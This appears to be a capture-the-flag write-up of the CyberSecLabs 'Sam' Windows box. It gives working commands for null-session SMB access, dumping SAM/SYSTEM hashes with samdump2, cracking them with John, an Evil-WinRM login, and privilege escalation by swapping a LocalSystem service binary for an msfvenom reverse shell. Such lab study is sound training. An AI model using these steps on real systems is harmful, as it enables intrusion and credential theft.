---
description: https://www.cyberseclabs.co.uk/labs/info/Sam/
---

# Sam

![](<../../../.gitbook/assets/image (525).png>)

## Nmap

```
sudo nmap 172.31.1.18 -p- -f -A

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Datacenter 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SAM
|   NetBIOS_Domain_Name: SAM
|   NetBIOS_Computer_Name: SAM
|   DNS_Domain_Name: SAM
|   DNS_Computer_Name: SAM                                                                                                                                                                                                                 
|   Product_Version: 10.0.14393                                                                                                                                                                                                            
|_  System_Time: 2020-12-12T15:22:30+00:00                                                                                                                                                                                                 
| ssl-cert: Subject: commonName=SAM                                                                                                                                                                                                        
| Not valid before: 2020-12-11T09:05:40                                                                                                                                                                                                    
|_Not valid after:  2021-06-12T09:05:40                                                                                                                                                                                                    
|_ssl-date: 2020-12-12T15:22:36+00:00; -1s from scanner time.                                                                                                                                                                              
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                                                      
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                                                
|_http-title: Not Found                                                                                                                                                                                                                    
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                                                      
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                                                
|_http-title: Not Found                                                                                                                                                                                                                    
49664/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                        
49665/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                        
49666/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                        
49668/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                        
49669/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                        
49675/tcp open  msrpc         Microsoft Windows RPC                                                                                                                                                                                        
49676/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: SAM, NetBIOS user: <unknown>, NetBIOS MAC: 02:db:2b:36:2f:a4 (unknown)
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: SAM
|   NetBIOS computer name: SAM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-12T15:22:31+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-12T15:22:31
|_  start_date: 2020-12-12T09:05:41

TRACEROUTE (using port 995/tcp)
HOP RTT      ADDRESS
1   30.56 ms 10.10.0.1
2   31.60 ms 172.31.1.18

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.68 seconds
```

## SMB

As we have SMB open we can do some quick checks for null authentication.

![](<../../../.gitbook/assets/image (527).png>)

We are able to enumerate the backups share on the host and then connect to it with the following command to gain a SMB shell with null authentication.

```
smbclient -U "" \\\\172.31.1.18\\backups
```

## SAM

As it looks like a backup of the system we should see if the SAM and SYSTEM files have been backed up. Normally these files are locked when the system is running but if backed up hopefully we will be able to download them.

First we need to go the directory `Windows\System32\Config` and then use the `get` command to download the files.

![](<../../../.gitbook/assets/image (528).png>)

Kali Linux comes pre-installed with a tool called `samdump2`. We can combine the SYSTEM and SAM file with this tool to extract local user accounts and hashes.

```
samdump2 SYSTEM SAM -o /home/kali/SAMhashes.txt
```

Once completed we can `cat` the file to confirm if we have extracted account hashes.

![](<../../../.gitbook/assets/image (529).png>)

## Password Cracking

From here we can remove the '\*disabled\*' lines so they do not effect the outcome of cracking tools such as `John`.

We can then use the following command with `John` to attempt to crack the hashes.

```
sudo john --format=NT --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt /home/kali/Desktop/SAMhashes
```

![](<../../../.gitbook/assets/image (530).png>)

We have the following credentials cracked: `jamie:rangers`.

## Initial Foothold

As port 5985 is open we can attempt to connect with `Evil-WinRM`.

```
evil-winrm -u jamie -p rangers -i 172.31.1.18 -s /home/kali/scripts/windows/
```

![](<../../../.gitbook/assets/image (531).png>)

## Privilege Escalation

I checked `systeminfo` in which we have no access to perform.

![](<../../../.gitbook/assets/image (532).png>)

I then run powerup.ps1 and JAWS.ps1 and was not able to identify any interesting points of escalation. However, after running the `services` command we see something worth looking into.

![](<../../../.gitbook/assets/image (533).png>)

The services monitor1 and monitor2 are not default services and should be looked into. I queried monitor1 with `sc.exe` and received the following:

![](<../../../.gitbook/assets/image (534).png>)

As the service is run by LocalSystem this will be an ideal candidate for privilege escalation if we can replace the binary with one of our own.

Lets move to the directory and see if we can delete the binary and if we can we should be able to replace it with a malicious binary.

![](<../../../.gitbook/assets/image (535) (1).png>)

I was able to delete the binary. I will now create a reverse shell with `msfvenom`, name it `monitor1.exe` and attempt to start the service.

![](<../../../.gitbook/assets/image (536).png>)

After this has completed we can then upload it with `Evil-WinRM`.

![](<../../../.gitbook/assets/image (537) (1).png>)

Create a `netcat` listener on the attacking machine to the port defined in the `msfvenom` payload.

![](<../../../.gitbook/assets/image (538) (1).png>)

Then start the service with `sc.exe` on the victim machine.

```
sc.exe start monitor1
```

![](<../../../.gitbook/assets/image (539).png>)

We can now grab the system flags.

As the Administrator account was disabled on the system we can now enable the account. Change the password and login with the Administrator account.

![](<../../../.gitbook/assets/image (540) (1).png>)

![](<../../../.gitbook/assets/image (541).png>)
